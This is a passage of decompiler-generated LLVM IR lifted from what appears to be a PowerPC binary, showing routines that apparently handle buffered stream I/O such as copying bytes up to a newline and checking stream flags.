dec_label_pc_10009c9c:                            ; preds = %dec_label_pc_10009c70, %dec_label_pc_10009cc0
  %v0_10009cb0 = phi i32 [ %v2_10009cc0, %dec_label_pc_10009cc0 ], [ %arg2, %dec_label_pc_10009c70 ]
  %v0_10009c9c = phi i32 [ %v2_10009cc4, %dec_label_pc_10009cc0 ], [ %v0_10009c80, %dec_label_pc_10009c70 ]
  %v1_10009ca0.in = phi i32 [ %v2_10009cc4, %dec_label_pc_10009cc0 ], [ %v0_10009c80, %dec_label_pc_10009c70 ]
  %v1_10009ca0 = icmp sgt i32 %v1_10009ca0.in, 0
  store i32 %v0_10009c9c, i32* @r27, align 4
  br i1 %v1_10009ca0, label %dec_label_pc_10009cac, label %dec_label_pc_10009ca4

dec_label_pc_10009ca4:                            ; preds = %dec_label_pc_10009c9c
  br label %dec_label_pc_10009cac

dec_label_pc_10009cac:                            ; preds = %dec_label_pc_10009c9c, %dec_label_pc_10009ca4
  %v0_10009cac = load i32, i32* @r30, align 4
  %v1_10009cac = add i32 %v0_10009cac, 4
  %v2_10009cac = inttoptr i32 %v1_10009cac to i32*
  %v3_10009cac = load i32, i32* %v2_10009cac, align 4
  store i32 268475576, i32* @lr, align 4
  %v3_10009cb4 = call i32 @function_10004dd0(i32 %v3_10009cac, i32 %v0_10009cb0)
  %v1_10009cb8 = icmp slt i32 %v3_10009cb4, 0
  br i1 %v1_10009cb8, label %dec_label_pc_10009ccc, label %dec_label_pc_10009cc0

dec_label_pc_10009cc0:                            ; preds = %dec_label_pc_10009cac
  %v0_10009cc0 = load i32, i32* @r29, align 4
  %v2_10009cc0 = add i32 %v0_10009cc0, %v3_10009cb4
  store i32 %v2_10009cc0, i32* @r29, align 4
  %v1_10009cc4 = load i32, i32* @r31, align 4
  %v2_10009cc4 = sub i32 %v1_10009cc4, %v3_10009cb4
  store i32 %v2_10009cc4, i32* @r31, align 4
  %v3_10009c90 = icmp eq i32 %v2_10009cc4, 0
  br i1 %v3_10009c90, label %dec_label_pc_10009c90.dec_label_pc_10009d38.loopexit_crit_edge, label %dec_label_pc_10009c9c

dec_label_pc_10009ccc:                            ; preds = %dec_label_pc_10009cac
  %v0_10009ccc = load i32, i32* @r30, align 4
  %v1_10009ccc = add i32 %v0_10009ccc, 8
  %v2_10009ccc = inttoptr i32 %v1_10009ccc to i32*
  %v3_10009ccc = load i32, i32* %v2_10009ccc, align 4
  store i32 %v3_10009ccc, i32* %r11.global-to-local, align 4
  %v1_10009cd0 = add i32 %v0_10009ccc, 12
  %v2_10009cd0 = inttoptr i32 %v1_10009cd0 to i32*
  %v3_10009cd0 = load i32, i32* %v2_10009cd0, align 4
  store i32 %v3_10009cd0, i32* %r0.global-to-local, align 4
  %v1_10009cd4 = inttoptr i32 %v0_10009ccc to i16*
  %v2_10009cd4 = load i16, i16* %v1_10009cd4, align 2
  %v2_10009cd8 = sub i32 %v3_10009cd0, %v3_10009ccc
  store i32 %v2_10009cd8, i32* %r0.global-to-local, align 4
  %v5_10009cd8 = icmp eq i32 %v2_10009cd8, 0
  %v1_10009cdc = or i16 %v2_10009cd4, 8
  store i16 %v1_10009cdc, i16* %v1_10009cd4, align 2
  br i1 %v5_10009cd8, label %dec_label_pc_10009ccc.dec_label_pc_10009d34_crit_edge, label %dec_label_pc_10009ce8

dec_label_pc_10009ccc.dec_label_pc_10009d34_crit_edge: ; preds = %dec_label_pc_10009ccc
  %v0_10009d34.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009d34

dec_label_pc_10009ce8:                            ; preds = %dec_label_pc_10009ccc
  %v0_10009ce8 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009ce8 = load i32, i32* @r31, align 4
  %v3_10009ce8 = icmp ugt i32 %v0_10009ce8, %v1_10009ce8
  br i1 %v3_10009ce8, label %dec_label_pc_10009ce8.dec_label_pc_10009cf4_crit_edge, label %dec_label_pc_10009cf0

dec_label_pc_10009ce8.dec_label_pc_10009cf4_crit_edge: ; preds = %dec_label_pc_10009ce8
  %v0_10009cf4.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10009cf4

dec_label_pc_10009cf0:                            ; preds = %dec_label_pc_10009ce8
  store i32 %v0_10009ce8, i32* @r27, align 4
  br label %dec_label_pc_10009cf4

dec_label_pc_10009cf4:                            ; preds = %dec_label_pc_10009ce8.dec_label_pc_10009cf4_crit_edge, %dec_label_pc_10009cf0
  %v0_10009cf4 = phi i32 [ %v0_10009cf4.pre, %dec_label_pc_10009ce8.dec_label_pc_10009cf4_crit_edge ], [ %v0_10009ce8, %dec_label_pc_10009cf0 ]
  store i32 %v0_10009cf4, i32* %ctr.global-to-local, align 4
  %v2_10009d00.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009cf8

dec_label_pc_10009cf8:                            ; preds = %dec_label_pc_10009d1c, %dec_label_pc_10009cf4
  %v2_10009d00 = phi i32 [ %v1_10009d1c, %dec_label_pc_10009d1c ], [ %v2_10009d00.pre, %dec_label_pc_10009cf4 ]
  %v0_10009cf8 = load i32, i32* @r29, align 4
  %v1_10009cf8 = inttoptr i32 %v0_10009cf8 to i8*
  %v2_10009cf8 = load i8, i8* %v1_10009cf8, align 1
  %v3_10009cf8 = zext i8 %v2_10009cf8 to i32
  store i32 %v3_10009cf8, i32* %r0.global-to-local, align 4
  %v1_10009cfc = add i32 %v0_10009cf8, 1
  store i32 %v1_10009cfc, i32* @r29, align 4
  %v3_10009d00 = inttoptr i32 %v2_10009d00 to i8*
  store i8 %v2_10009cf8, i8* %v3_10009d00, align 1
  %v0_10009d04 = load i32, i32* %r0.global-to-local, align 4
  %v1_10009d04 = urem i32 %v0_10009d04, 256
  store i32 %v1_10009d04, i32* %r0.global-to-local, align 4
  %v3_10009d08 = icmp eq i32 %v1_10009d04, 10
  br i1 %v3_10009d08, label %dec_label_pc_10009d10, label %dec_label_pc_10009d1c

dec_label_pc_10009d10:                            ; preds = %dec_label_pc_10009cf8
  %v0_10009d10 = load i32, i32* @r30, align 4
  %v1_10009d10 = inttoptr i32 %v0_10009d10 to i16*
  %v2_10009d10 = load i16, i16* %v1_10009d10, align 2
  %v3_10009d10 = zext i16 %v2_10009d10 to i32
  store i32 %v3_10009d10, i32* %r0.global-to-local, align 4
  %v1_10009d14 = and i32 %v3_10009d10, 256
  %v3_10009d14 = icmp eq i32 %v1_10009d14, 0
  br i1 %v3_10009d14, label %dec_label_pc_10009d1c, label %dec_label_pc_10009d10.dec_label_pc_10009d24_crit_edge

dec_label_pc_10009d10.dec_label_pc_10009d24_crit_edge: ; preds = %dec_label_pc_10009d10
  %v0_10009d28.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10009d24

dec_label_pc_10009d1c:                            ; preds = %dec_label_pc_10009d10, %dec_label_pc_10009cf8
  %v0_10009d1c = load i32, i32* %r11.global-to-local, align 4
  %v1_10009d1c = add i32 %v0_10009d1c, 1
  store i32 %v1_10009d1c, i32* %r11.global-to-local, align 4
  %v0_10009d20 = load i32, i32* %ctr.global-to-local, align 4
  %v1_10009d20 = add i32 %v0_10009d20, -1
  store i32 %v1_10009d20, i32* %ctr.global-to-local, align 4
  %v2_10009d20 = icmp eq i32 %v1_10009d20, 0
  br i1 %v2_10009d20, label %dec_label_pc_10009d1c.dec_label_pc_10009d24_crit_edge, label %dec_label_pc_10009cf8

dec_label_pc_10009d1c.dec_label_pc_10009d24_crit_edge: ; preds = %dec_label_pc_10009d1c
  %v0_10009d24.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_10009d24

dec_label_pc_10009d24:                            ; preds = %dec_label_pc_10009d10.dec_label_pc_10009d24_crit_edge, %dec_label_pc_10009d1c.dec_label_pc_10009d24_crit_edge
  %v0_10009d28 = phi i32 [ %v1_10009d1c, %dec_label_pc_10009d1c.dec_label_pc_10009d24_crit_edge ], [ %v0_10009d28.pre, %dec_label_pc_10009d10.dec_label_pc_10009d24_crit_edge ]
  %v0_10009d24 = phi i32 [ %v0_10009d24.pre, %dec_label_pc_10009d1c.dec_label_pc_10009d24_crit_edge ], [ %v0_10009d10, %dec_label_pc_10009d10.dec_label_pc_10009d24_crit_edge ]
  %v1_10009d24 = add i32 %v0_10009d24, 8
  %v2_10009d24 = inttoptr i32 %v1_10009d24 to i32*
  %v3_10009d24 = load i32, i32* %v2_10009d24, align 4
  store i32 %v3_10009d24, i32* %r0.global-to-local, align 4
  %v2_10009d28 = add i32 %v0_10009d24, 16
  %v3_10009d28 = inttoptr i32 %v2_10009d28 to i32*
  store i32 %v0_10009d28, i32* %v3_10009d28, align 4
  %v0_10009d2c = load i32, i32* %r0.global-to-local, align 4
  %v1_10009d2c = load i32, i32* %r11.global-to-local, align 4
  %v2_10009d2c = sub i32 %v1_10009d2c, %v0_10009d2c
  store i32 %v2_10009d2c, i32* %r0.global-to-local, align 4
  %v1_10009d30 = load i32, i32* @r31, align 4
  %v2_10009d30 = sub i32 %v1_10009d30, %v2_10009d2c
  store i32 %v2_10009d30, i32* @r31, align 4
  br label %dec_label_pc_10009d34

dec_label_pc_10009d34:                            ; preds = %dec_label_pc_10009ccc.dec_label_pc_10009d34_crit_edge, %dec_label_pc_10009d24
  %v0_10009d34 = phi i32 [ %v0_10009d34.pre, %dec_label_pc_10009ccc.dec_label_pc_10009d34_crit_edge ], [ %v2_10009d30, %dec_label_pc_10009d24 ]
  %v1_10009d34 = load i32, i32* @r28, align 4
  %v2_10009d34 = sub i32 %v1_10009d34, %v0_10009d34
  store i32 %v2_10009d34, i32* @r28, align 4
  br label %dec_label_pc_10009d38

dec_label_pc_10009c90.dec_label_pc_10009d38.loopexit_crit_edge: ; preds = %dec_label_pc_10009cc0
  %v0_10009d3c.pre.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10009d38

dec_label_pc_10009d38:                            ; preds = %dec_label_pc_10009c70, %dec_label_pc_10009c90.dec_label_pc_10009d38.loopexit_crit_edge, %dec_label_pc_10009d34
  %v0_10009d3c = phi i32 [ %v2_10009d34, %dec_label_pc_10009d34 ], [ %v0_10009d3c.pre.pre, %dec_label_pc_10009c90.dec_label_pc_10009d38.loopexit_crit_edge ], [ 0, %dec_label_pc_10009c70 ]
  store i32 %v0_10009c74, i32* %r0.global-to-local, align 4
  ret i32 %v0_10009d3c

; uselistorder directives
  uselistorder i32 %v0_10009d24, { 1, 0 }
  uselistorder i32 %v1_10009d20, { 1, 0 }
  uselistorder i32 %v1_10009d1c, { 0, 2, 1 }
  uselistorder i32 %v1_10009d04, { 1, 0 }
  uselistorder i32 %v2_10009cc4, { 3, 2, 1, 0 }
  uselistorder i32 %v2_10009cc0, { 1, 0 }
  uselistorder i32 %v3_10009cb4, { 1, 0, 2 }
  uselistorder i32* %r11.global-to-local, { 3, 0, 4, 1, 2, 5 }
  uselistorder label %dec_label_pc_10009d38, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10009d34, { 1, 0 }
  uselistorder label %dec_label_pc_10009d24, { 1, 0 }
  uselistorder label %dec_label_pc_10009cf4, { 1, 0 }
  uselistorder label %dec_label_pc_10009cac, { 1, 0 }
  uselistorder label %dec_label_pc_10009c9c, { 1, 0 }
}

define i32 @function_10009d50(i32 %arg1, i32 %arg2, i16* %arg3) local_unnamed_addr {
dec_label_pc_10009d50:
  %tmp = ptrtoint i16* %arg3 to i32
  %v0_10009d54 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 %arg1, i32* @r28, align 4
  store i32 %arg2, i32* @r29, align 4
  %v3_10009d6c = load i16, i16* %arg3, align 2
  %v1_10009d70 = and i16 %v3_10009d6c, 512
  %v3_10009d70 = icmp eq i16 %v1_10009d70, 0
  br i1 %v3_10009d70, label %dec_label_pc_10009d78, label %dec_label_pc_10009e84

dec_label_pc_10009d78:                            ; preds = %dec_label_pc_10009d50
  %v2_10009d78 = add i32 %tmp, 4
  %v3_10009d78 = inttoptr i32 %v2_10009d78 to i32*
  %v4_10009d78 = load i32, i32* %v3_10009d78, align 4
  %v2_10009d7c = add i32 %tmp, 16
  %v3_10009d7c = inttoptr i32 %v2_10009d7c to i32*
  %v4_10009d7c = load i32, i32* %v3_10009d7c, align 4
  store i32 %v4_10009d7c, i32* @r3, align 4
  %v2_10009d80 = add i32 %tmp, 12
  %v3_10009d80 = inttoptr i32 %v2_10009d80 to i32*
  %v4_10009d80 = load i32, i32* %v3_10009d80, align 4
  %v3_10009d84 = icmp eq i32 %v4_10009d78, -2
  %v2_10009d8c = sub i32 %v4_10009d80, %v4_10009d7c
  br i1 %v3_10009d84, label %dec_label_pc_10009d8c, label %dec_label_pc_10009dbc

dec_label_pc_10009d8c:                            ; preds = %dec_label_pc_10009d78
  %v3_10009d94 = icmp ult i32 %v2_10009d8c, %arg2
  br i1 %v3_10009d94, label %dec_label_pc_10009d9c, label %dec_label_pc_10009da0

dec_label_pc_10009d9c:                            ; preds = %dec_label_pc_10009d8c
  br label %dec_label_pc_10009da0

dec_label_pc_10009da0:                            ; preds = %dec_label_pc_10009d8c, %dec_label_pc_10009d9c
  %storemerge = phi i32 [ %v2_10009d8c, %dec_label_pc_10009d9c ], [ %arg2, %dec_label_pc_10009d8c ]
  %v0_10009da4 = phi i32 [ %v2_10009d8c, %dec_label_pc_10009d9c ], [ %arg2, %dec_label_pc_10009d8c ]
  store i32 %storemerge, i32* @r31, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 %v0_10009da4, i32* @r5, align 4
  store i32 268475820, i32* @lr, align 4
  %v0_10009da8 = call i32 @function_10007104()
  %v0_10009dac = load i32, i32* @r30, align 4
  %v1_10009dac = add i32 %v0_10009dac, 16
  %v2_10009dac = inttoptr i32 %v1_10009dac to i32*
  %v3_10009dac = load i32, i32* %v2_10009dac, align 4
  %v1_10009db0 = load i32, i32* @r31, align 4
  %v2_10009db0 = add i32 %v1_10009db0, %v3_10009dac
  store i32 %v2_10009db0, i32* %v2_10009dac, align 4
  br label %dec_label_pc_10009ea4

dec_label_pc_10009dbc:                            ; preds = %dec_label_pc_10009d78
  %v3_10009dc0 = icmp ult i32 %v2_10009d8c, %arg2
  br i1 %v3_10009dc0, label %dec_label_pc_10009e60, label %dec_label_pc_10009dc8

dec_label_pc_10009dc8:                            ; preds = %dec_label_pc_10009dbc
  store i32 %arg1, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 268475860, i32* @lr, align 4
  %v0_10009dd0 = call i32 @function_10007104()
  %v0_10009dd4 = load i32, i32* @r30, align 4
  %v1_10009dd4 = inttoptr i32 %v0_10009dd4 to i16*
  %v2_10009dd4 = load i16, i16* %v1_10009dd4, align 2
  %v1_10009dd8 = add i32 %v0_10009dd4, 16
  %v2_10009dd8 = inttoptr i32 %v1_10009dd8 to i32*
  %v3_10009dd8 = load i32, i32* %v2_10009dd8, align 4
  %v1_10009ddc = and i16 %v2_10009dd4, 256
  %v3_10009ddc = icmp eq i16 %v1_10009ddc, 0
  %v1_10009de0 = load i32, i32* @r29, align 4
  %v2_10009de0 = add i32 %v1_10009de0, %v3_10009dd8
  store i32 %v2_10009de0, i32* %v2_10009dd8, align 4
  br i1 %v3_10009ddc, label %dec_label_pc_10009ea4, label %dec_label_pc_10009dec

dec_label_pc_10009dec:                            ; preds = %dec_label_pc_10009dc8
  %v0_10009dec = load i32, i32* @r28, align 4
  %v0_10009df4 = load i32, i32* @r29, align 4
  store i32 268475900, i32* @lr, align 4
  %v4_10009df8 = call i32 @function_1000ab48(i32 %v0_10009dec, i32 10, i32 %v0_10009df4, i32 %v2_10009de0)
  %v3_10009dfc = icmp eq i32 %v4_10009df8, 0
  br i1 %v3_10009dfc, label %dec_label_pc_10009ea4, label %dec_label_pc_10009e04

dec_label_pc_10009e04:                            ; preds = %dec_label_pc_10009dec
  %v0_10009e04 = load i32, i32* @r30, align 4
  store i32 %v0_10009e04, i32* @r3, align 4
  store i32 268475916, i32* @lr, align 4
  %v0_10009e08 = call i32 @function_10005838()
  %v3_10009e0c = icmp eq i32 %v0_10009e08, 0
  br i1 %v3_10009e0c, label %dec_label_pc_10009ea4, label %dec_label_pc_10009e14

dec_label_pc_10009e14:                            ; preds = %dec_label_pc_10009e04
  %v0_10009e14 = load i32, i32* @r29, align 4
  %v3_10009e14 = icmp ugt i32 %v0_10009e14, %v0_10009e08
  %v0_10009e08.v0_10009e18 = select i1 %v3_10009e14, i32 %v0_10009e08, i32 %v0_10009e14
  store i32 %v0_10009e08.v0_10009e18, i32* @r31, align 4
  %v2_10009e24 = sub i32 %v0_10009e14, %v0_10009e08.v0_10009e18
  %v0_10009e2c = load i32, i32* @r28, align 4
  %v2_10009e2c = add i32 %v0_10009e2c, %v2_10009e24
  store i32 %v2_10009e2c, i32* @r28, align 4
  store i32 %v2_10009e2c, i32* @r3, align 4
  store i32 268475964, i32* @lr, align 4
  %v3_10009e38 = call i32 @function_1000aa0c(i32 %v2_10009e2c, i32 10, i32 %v0_10009e08.v0_10009e18)
  %v3_10009e3c = icmp eq i32 %v3_10009e38, 0
  br i1 %v3_10009e3c, label %dec_label_pc_10009ea4, label %dec_label_pc_10009e44

dec_label_pc_10009e44:                            ; preds = %dec_label_pc_10009e14
  %v0_10009e44 = load i32, i32* @r30, align 4
  %v1_10009e44 = add i32 %v0_10009e44, 16
  %v2_10009e44 = inttoptr i32 %v1_10009e44 to i32*
  %v3_10009e44 = load i32, i32* %v2_10009e44, align 4
  %v0_10009e48 = load i32, i32* @r28, align 4
  %v1_10009e48 = load i32, i32* @r31, align 4
  %v2_10009e48 = sub i32 %v0_10009e48, %v3_10009e38
  %v2_10009e4c = add i32 %v2_10009e48, %v1_10009e48
  %v1_10009e50 = load i32, i32* @r29, align 4
  %v2_10009e50 = sub i32 %v1_10009e50, %v2_10009e4c
  store i32 %v2_10009e50, i32* @r29, align 4
  %v2_10009e54 = sub i32 %v3_10009e44, %v2_10009e4c
  store i32 %v2_10009e54, i32* %v2_10009e44, align 4
  br label %dec_label_pc_10009ea4

dec_label_pc_10009e60:                            ; preds = %dec_label_pc_10009dbc
  %v2_10009e60 = add i32 %tmp, 8
  %v3_10009e60 = inttoptr i32 %v2_10009e60 to i32*
  %v4_10009e60 = load i32, i32* %v3_10009e60, align 4
  %v4_10009e64 = icmp eq i32 %v4_10009d7c, %v4_10009e60
  br i1 %v4_10009e64, label %dec_label_pc_10009e84, label %dec_label_pc_10009e6c

dec_label_pc_10009e6c:                            ; preds = %dec_label_pc_10009e60
  store i32 %tmp, i32* @r3, align 4
  store i32 268476020, i32* @lr, align 4
  %v0_10009e70 = call i32 @function_10005838()
  %v3_10009e74 = icmp eq i32 %v0_10009e70, 0
  br i1 %v3_10009e74, label %dec_label_pc_10009e6c.dec_label_pc_10009e84_crit_edge, label %dec_label_pc_10009e7c

dec_label_pc_10009e6c.dec_label_pc_10009e84_crit_edge: ; preds = %dec_label_pc_10009e6c
  %v0_10009e88.pre = load i32, i32* @r30, align 4
  %v0_10009e8c.pre = load i32, i32* @r28, align 4
  %v0_10009e90.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_10009e84

dec_label_pc_10009e7c:                            ; preds = %dec_label_pc_10009e6c
  store i32 0, i32* @r29, align 4
  br label %dec_label_pc_10009ea4

dec_label_pc_10009e84:                            ; preds = %dec_label_pc_10009e6c.dec_label_pc_10009e84_crit_edge, %dec_label_pc_10009d50, %dec_label_pc_10009e60
  %v0_10009e90 = phi i32 [ %v0_10009e90.pre, %dec_label_pc_10009e6c.dec_label_pc_10009e84_crit_edge ], [ %arg2, %dec_label_pc_10009d50 ], [ %arg2, %dec_label_pc_10009e60 ]
  %v0_10009e8c = phi i32 [ %v0_10009e8c.pre, %dec_label_pc_10009e6c.dec_label_pc_10009e84_crit_edge ], [ %arg1, %dec_label_pc_10009d50 ], [ %arg1, %dec_label_pc_10009e60 ]
  %v0_10009e88 = phi i32 [ %v0_10009e88.pre, %dec_label_pc_10009e6c.dec_label_pc_10009e84_crit_edge ], [ %tmp, %dec_label_pc_10009d50 ], [ %tmp, %dec_label_pc_10009e60 ]
  %v1_10009e88 = inttoptr i32 %v0_10009e88 to i16*
  store i32 %v0_10009e90, i32* @r5, align 4
  store i32 %v0_10009d54, i32* @lr, align 4
  %v5_10009ea0 = call i32 @function_10009c70(i16* %v1_10009e88, i32 %v0_10009e8c)
  br label %dec_label_pc_10009ea4

dec_label_pc_10009ea4:                            ; preds = %dec_label_pc_10009e14, %dec_label_pc_10009e04, %dec_label_pc_10009dec, %dec_label_pc_10009dc8, %dec_label_pc_10009e7c, %dec_label_pc_10009e44, %dec_label_pc_10009da0, %dec_label_pc_10009e84
  %v0_10009ea8 = load i32, i32* @r29, align 4
  ret i32 %v0_10009ea8

; uselistorder directives
  uselistorder i32 %v2_10009e4c, { 1, 0 }
  uselistorder i32 %v0_10009e08.v0_10009e18, { 0, 2, 1 }
  uselistorder i32 %v0_10009e14, { 1, 0, 2 }
  uselistorder i32 %v2_10009d8c, { 3, 0, 1, 2 }
  uselistorder i32 %tmp, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 6, 0, 1, 5, 7 }
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_10009ea4, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_10009e84, { 0, 2, 1 }
  uselistorder label %dec_label_pc_10009da0, { 1, 0 }
}

define i32 @function_10009ebc(i16* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_10009ebc:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %v0_10009ec0 = load i32, i32* @lr, align 4
  store i32 %v0_10009ec0, i32* %r0.global-to-local, align 4
  %v0_10009ec4 = load i32, i32* @r31, align 4
  store i32 %tmp, i32* @r31, align 4
  %v3_10009ed0 = load i16, i16* %arg1, align 2
  %v4_10009ed0 = zext i16 %v3_10009ed0 to i32
  store i32 %v4_10009ed0, i32* %r0.global-to-local, align 4
  %v2_10009ed4 = and i32 %v4_10009ed0, %arg2
  store i32 %v2_10009ed4, i32* %r9.global-to-local, align 4
  %v5_10009ed4 = icmp eq i32 %v2_10009ed4, 0
  br i1 %v5_10009ed4, label %dec_label_pc_10009edc, label %dec_label_pc_10009eec

dec_label_pc_10009edc:                            ; preds = %dec_label_pc_10009ebc
  %v1_10009edc = and i32 %v4_10009ed0, 2176
  store i32 %v1_10009edc, i32* %r9.global-to-local, align 4
  %v3_10009edc = icmp eq i32 %v1_10009edc, 0
  br i1 %v3_10009edc, label %dec_label_pc_10009ee4, label %dec_label_pc_10009ef8

dec_label_pc_10009ee4:                            ; preds = %dec_label_pc_10009edc
  %v2_10009ee4 = or i32 %v4_10009ed0, %arg2
  store i32 %v2_10009ee4, i32* %r0.global-to-local, align 4
  %v1_10009ee8 = trunc i32 %v2_10009ee4 to i16
  store i16 %v1_10009ee8, i16* %arg1, align 2
  %v0_10009eec.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009eec

dec_label_pc_10009eec:                            ; preds = %dec_label_pc_10009ebc, %dec_label_pc_10009ee4
  %v0_10009f28 = phi i32 [ %tmp, %dec_label_pc_10009ebc ], [ %v0_10009eec.pre, %dec_label_pc_10009ee4 ]
  %v1_10009eec = inttoptr i32 %v0_10009f28 to i16*
  %v2_10009eec = load i16, i16* %v1_10009eec, align 2
  %v3_10009eec = zext i16 %v2_10009eec to i32
  %v1_10009ef0 = and i32 %v3_10009eec, 32
  store i32 %v1_10009ef0, i32* %r0.global-to-local, align 4
  %v3_10009ef0 = icmp eq i32 %v1_10009ef0, 0
  br i1 %v3_10009ef0, label %dec_label_pc_10009f18, label %dec_label_pc_10009ef8

dec_label_pc_10009ef8:                            ; preds = %dec_label_pc_10009edc, %dec_label_pc_10009eec
  %v0_10009ef8 = call i32 @function_10004e38()
  store i32 %v0_10009ef8, i32* %r3.global-to-local, align 4
  store i32 9, i32* %r0.global-to-local, align 4
  %v2_10009f00 = inttoptr i32 %v0_10009ef8 to i32*
  store i32 9, i32* %v2_10009f00, align 4
  br label %dec_label_pc_10009f04

dec_label_pc_10009f04:                            ; preds = %dec_label_pc_10009f40, %dec_label_pc_10009ef8
  %v0_10009f04 = load i32, i32* @r31, align 4
  %v1_10009f04 = inttoptr i32 %v0_10009f04 to i16*
  %v2_10009f04 = load i16, i16* %v1_10009f04, align 2
  %v3_10009f04 = zext i16 %v2_10009f04 to i32
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_10009f0c = or i32 %v3_10009f04, 8
  store i32 %v1_10009f0c, i32* %r0.global-to-local, align 4
  %v1_10009f10 = trunc i32 %v1_10009f0c to i16
  store i16 %v1_10009f10, i16* %v1_10009f04, align 2
  br label %dec_label_pc_10009fa0

dec_label_pc_10009f18:                            ; preds = %dec_label_pc_10009eec
  %tmp8 = urem i16 %v2_10009eec, 4
  %v1_10009f18 = zext i16 %tmp8 to i32
  store i32 %v1_10009f18, i32* %r0.global-to-local, align 4
  %v3_10009f18 = icmp eq i16 %tmp8, 0
  br i1 %v3_10009f18, label %dec_label_pc_10009f7c, label %dec_label_pc_10009f20

dec_label_pc_10009f20:                            ; preds = %dec_label_pc_10009f18
  %v1_10009f20 = and i32 %v3_10009eec, 4
  store i32 %v1_10009f20, i32* %r9.global-to-local, align 4
  %v3_10009f20 = icmp eq i32 %v1_10009f20, 0
  br i1 %v3_10009f20, label %dec_label_pc_10009f28, label %dec_label_pc_10009f60

dec_label_pc_10009f28:                            ; preds = %dec_label_pc_10009f20
  %v1_10009f28 = add i32 %v0_10009f28, 20
  %v2_10009f28 = inttoptr i32 %v1_10009f28 to i32*
  %v3_10009f28 = load i32, i32* %v2_10009f28, align 4
  store i32 %v3_10009f28, i32* %r0.global-to-local, align 4
  %v1_10009f2c = add i32 %v0_10009f28, 16
  %v2_10009f2c = inttoptr i32 %v1_10009f2c to i32*
  %v3_10009f2c = load i32, i32* %v2_10009f2c, align 4
  store i32 %v3_10009f2c, i32* %r9.global-to-local, align 4
  %v4_10009f30 = icmp eq i32 %v3_10009f28, %v3_10009f2c
  br i1 %v4_10009f30, label %dec_label_pc_10009f38, label %dec_label_pc_10009f40

dec_label_pc_10009f38:                            ; preds = %dec_label_pc_10009f28
  %v1_10009f38 = and i32 %v3_10009eec, 2
  store i32 %v1_10009f38, i32* %r0.global-to-local, align 4
  %v3_10009f38 = icmp eq i32 %v1_10009f38, 0
  br i1 %v3_10009f38, label %dec_label_pc_10009f60, label %dec_label_pc_10009f40

dec_label_pc_10009f40:                            ; preds = %dec_label_pc_10009f28, %dec_label_pc_10009f38
  %v1_10009f40 = and i32 %v3_10009eec, 1024
  store i32 %v1_10009f40, i32* %r9.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v0_10009f48 = call i32 @__asm_mfcr()
  store i32 %v0_10009f48, i32* %r3.global-to-local, align 4
  %v1_10009f4c = call i32 @__asm_rlwinm(i32 %v0_10009f48, i32 3, i32 31, i32 31)
  %v1_10009f50 = sub i32 2, %v1_10009f4c
  store i32 %v1_10009f50, i32* @r5, align 4
  store i32 268476248, i32* @lr, align 4
  %v1_10009f54 = inttoptr i32 %v1_10009f50 to i16*
  %v2_10009f54 = call i32 @function_1000bb78(i16* %v1_10009f54)
  store i32 %v2_10009f54, i32* %r3.global-to-local, align 4
  %v3_10009f58 = icmp eq i32 %v2_10009f54, 0
  br i1 %v3_10009f58, label %dec_label_pc_10009f40.dec_label_pc_10009f60_crit_edge, label %dec_label_pc_10009f04

dec_label_pc_10009f40.dec_label_pc_10009f60_crit_edge: ; preds = %dec_label_pc_10009f40
  %v0_10009f60.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10009f60

dec_label_pc_10009f60:                            ; preds = %dec_label_pc_10009f40.dec_label_pc_10009f60_crit_edge, %dec_label_pc_10009f20, %dec_label_pc_10009f38
  %v0_10009f60 = phi i32 [ %v0_10009f60.pre, %dec_label_pc_10009f40.dec_label_pc_10009f60_crit_edge ], [ %v0_10009f28, %dec_label_pc_10009f20 ], [ %v0_10009f28, %dec_label_pc_10009f38 ]
  %v1_10009f60 = inttoptr i32 %v0_10009f60 to i16*
  %v2_10009f60 = load i16, i16* %v1_10009f60, align 2
  %v3_10009f60 = zext i16 %v2_10009f60 to i32
  store i32 %v3_10009f60, i32* %r0.global-to-local, align 4
  %v1_10009f64 = add i32 %v0_10009f60, 8
  %v2_10009f64 = inttoptr i32 %v1_10009f64 to i32*
  %v3_10009f64 = load i32, i32* %v2_10009f64, align 4
  store i32 %v3_10009f64, i32* %r9.global-to-local, align 4
  %v1_10009f68 = call i32 @__asm_rlwinm(i32 %v3_10009f60, i32 0, i32 0, i32 29)
  %v2_10009f68 = trunc i32 %v1_10009f68 to i16
  store i32 %v1_10009f68, i32* %r0.global-to-local, align 4
  %v3_10009f6c = load i32, i32* @r31, align 4
  %v4_10009f6c = inttoptr i32 %v3_10009f6c to i16*
  store i16 %v2_10009f68, i16* %v4_10009f6c, align 2
  %v0_10009f70 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f70 = load i32, i32* @r31, align 4
  %v2_10009f70 = add i32 %v1_10009f70, 20
  %v3_10009f70 = inttoptr i32 %v2_10009f70 to i32*
  store i32 %v0_10009f70, i32* %v3_10009f70, align 4
  %v0_10009f74 = load i32, i32* %r9.global-to-local, align 4
  %v1_10009f74 = load i32, i32* @r31, align 4
  %v2_10009f74 = add i32 %v1_10009f74, 24
  %v3_10009f74 = inttoptr i32 %v2_10009f74 to i32*
